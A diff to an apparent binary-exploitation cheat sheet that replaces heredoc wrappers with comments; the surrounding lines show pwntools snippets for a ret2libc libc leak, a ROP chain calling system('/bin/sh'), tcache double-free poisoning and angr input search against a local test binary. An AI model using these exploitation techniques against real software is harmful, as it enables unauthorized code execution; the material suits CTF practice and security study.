@@ -133,7 +133,7 @@ print(payload)
 " | ./vulnerable
 
 # ret2libc (bypass NX)
-python3 << 'EOF'
+# Python script:
 from pwn import *
 elf = ELF('./vulnerable')
 libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
@@ -141,7 +141,6 @@ rop = ROP(elf)
 rop.call('puts', [elf.got['puts']])     # leak libc address
 rop.call(elf.sym['main'])                # return to main
 # ... send payload, parse leak, compute system() address
-EOF
 ```
 
 ### ROP and Format Strings
@@ -152,7 +151,7 @@ ROPgadget --binary ./vulnerable | grep "pop rdi"
 ropper -f ./vulnerable --search "pop rdi"
 
 # ROP chain construction with pwntools
-python3 << 'EOF'
+# Python script:
 from pwn import *
 elf = ELF('./vulnerable')
 rop = ROP(elf)
@@ -160,7 +159,6 @@ rop.raw(rop.find_gadget(['pop rdi', 'ret'])[0])
 rop.raw(next(elf.search(b'/bin/sh')))
 rop.raw(elf.sym['system'])
 print(rop.dump())
-EOF
 
 # Format string exploitation
 # Leak stack values
@@ -201,7 +199,7 @@ gdb ./vulnerable
 # - Fastbin dup: double-free in fastbin for arbitrary alloc
 
 # pwntools heap helpers
-python3 << 'EOF'
+# Python script:
 from pwn import *
 p = process('./vulnerable')
 def alloc(size, data):
@@ -218,7 +216,6 @@ free(0); free(1); free(0)  # double free
 alloc(0x20, p64(target_addr))  # poison tcache
 alloc(0x20, b'CCCC')
 alloc(0x20, b'DDDD')    # allocated at target_addr
-EOF
 ```
 
 ---
@@ -399,7 +396,7 @@ strace ./binary         # system calls (open, read, write, etc.)
 # catch syscall ptrace -> commands -> set $rax=0 -> continue -> end
 
 # angr symbolic execution
-python3 << 'EOF'
+# Python script:
 import angr
 proj = angr.Project('./binary', auto_load_libs=False)
 state = proj.factory.entry_state()
@@ -407,7 +404,6 @@ simgr = proj.factory.simgr(state)
 simgr.explore(find=0x401234, avoid=0x401256)
 if simgr.found:
     print(simgr.found[0].posix.dumps(0))  # stdin that reaches target
-EOF
 ```
 
 ---
